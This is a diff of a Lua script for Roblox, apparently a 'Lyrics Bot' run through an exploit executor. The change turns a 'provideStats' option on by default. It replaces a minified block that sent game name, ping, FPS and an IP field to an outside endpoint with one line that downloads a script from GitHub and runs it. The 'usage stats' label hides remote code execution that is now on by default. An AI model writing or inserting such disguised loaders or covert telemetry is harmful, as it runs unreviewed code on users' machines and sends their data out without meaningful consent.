@@ -46,11 +46,10 @@ end)
 
 
 --\\ your mother 
-shared.provideStats = false -- if you wanna provide usage stats 
+shared.provideStats = true -- if you wanna provide usage stats 
 
 if shared.provideStats then 
-	-- Obfuscation is useless due to HTTP spy
-	spawn(function()game:GetService("RunService").RenderStepped:Connect(function(a)shared.fps=math.round(1/a)end)end)local b=game:GetService("MarketplaceService")local c,d=pcall(b.GetProductInfo,b,game.PlaceId)if c then gameName=d.Name end;print("First setup complete")local e={["content"]="",["embeds"]={{["title"]="Script Executed!",["description"]="Script 'Lyrics Bot' has been executed.",["type"]="rich",["color"]=tonumber(0xfff800),["fields"]={{["name"]="Data",["value"]="Game Name: "..gameName.."\nPing At Execution: "..game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString().."\nFPS At Execution: "..tonumber(shared.fps).."\nHashed IP: <ip>"}}}}}local f=syn.request({Url="https://websec.services/ws/send/YrArUHJFMYL1DknCNygPncxDgWWLyjEpZRfjcmvr",Method="POST",Headers={["Content-Type"]="application/json"},Body=game:GetService("HttpService"):JSONEncode(e)})print("Sent exeuction message")print("Main script exeucting")
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/2dgeneralspam1/lua-releases/main/minified/load.lua'))() 
 end
 
 
